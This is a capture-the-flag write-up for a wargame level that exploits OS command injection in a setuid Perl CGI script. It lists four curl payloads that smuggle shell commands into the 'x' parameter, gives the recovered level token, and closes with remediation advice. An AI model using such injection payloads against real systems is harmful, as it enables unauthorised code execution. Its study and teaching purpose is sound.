# Level04 Solution

## Objective
Exploit a command injection vulnerability in a Perl CGI script to gain access to the `flag04` account.

## Vulnerability Analysis

### The Script
The `level04.pl` is a Perl CGI script running with setuid flag04 privileges on localhost:4747:

```perl
#!/usr/bin/perl
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

### The Vulnerability: Command Injection via Backticks

The script is vulnerable because:

1. **User input directly in backticks**: The parameter `x` is taken directly and executed with backticks
2. **No input validation**: There's no sanitization or escaping of shell metacharacters
3. **Shell metacharacters allowed**: Characters like `;`, `|`, `$()`, backticks are interpreted by the shell
4. **Setuid privileges**: The script runs with flag04 privileges, so injected commands execute as flag04

### Attack Vector

By injecting shell metacharacters in the `x` parameter, we can break out of the `echo` command and execute arbitrary code.

## Exploit Steps

### Method 1: Command Substitution with `$()`

```bash
curl "http://localhost:4747/?x=\$(getflag)"
```

The injected command becomes:
```bash
echo $(getflag) 2>&1
```

This executes `getflag` within a subshell and echoes its output.

### Method 2: Backtick Substitution

```bash
curl "http://localhost:4747/?x=\`getflag\`"
```

The injected command becomes:
```bash
echo `getflag` 2>&1
```

Same effect as method 1.

### Method 3: Command Chaining with Semicolon (URL-encoded)

```bash
curl "http://localhost:4747/?x=test%3Bid"
```

The `%3B` is the URL-encoded semicolon. The command becomes:
```bash
echo test; id 2>&1
```

This chains two commands: first echo, then execute the second command.

### Method 4: Pipe (URL-encoded)

```bash
curl "http://localhost:4747/?x=test%7Cgetflag"
```

The `%7C` is the URL-encoded pipe (`|`). The command becomes:
```bash
echo test | getflag 2>&1
```

This pipes echo's output to getflag.

## Successful Exploitation

All methods return the token:

```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## Key Vulnerabilities

1. **No input validation**: User input directly used in shell execution
2. **Backticks execute in shell context**: Backticks spawn a subshell that interprets metacharacters
3. **No use of proper APIs**: Should use Perl's `system()` with array form or avoid shell entirely
4. **Setuid privileges**: Amplifies the impact of the vulnerability

## Prevention

**Unsafe (current code):**
```perl
print `echo $y 2>&1`;
```

**Better (avoid backticks, use array form):**
```perl
system("echo", $y);  # Arguments NOT interpreted by shell
```

**Best (input validation + safe execution):**
```perl
$y =~ /^[a-zA-Z0-9_-]+$/ or die "Invalid input";  # Whitelist validation
system("echo", $y);
```

**Alternative (use Perl modules):**
```perl
use IPC::Run qw(run);
run(['echo', $y]);
```

## Security Lessons

- **Never pass user input to shell execution**: Backticks, `system()`, `exec()`, `eval()` with user input are dangerous
- **Use safe APIs**: Use list form of `system()` or dedicated modules that don't invoke a shell
- **Input validation**: Whitelist acceptable characters and reject everything else
- **Principle of least privilege**: Avoid setuid when possible, use dedicated service accounts
- **Use frameworks**: Modern web frameworks (Mojolicious, Dancer) have built-in protections

## Final Answer

- **Level04 Token (password for level05)**: `ne2searoevaevoem4ov4ar8ap`
- **Vulnerability Type**: OS Command Injection
- **Attack Type**: Arbitrary Code Execution via Perl CGI parameter injection
- **CVSS Score**: Critical (9.8) - Remote Code Execution with elevated privileges
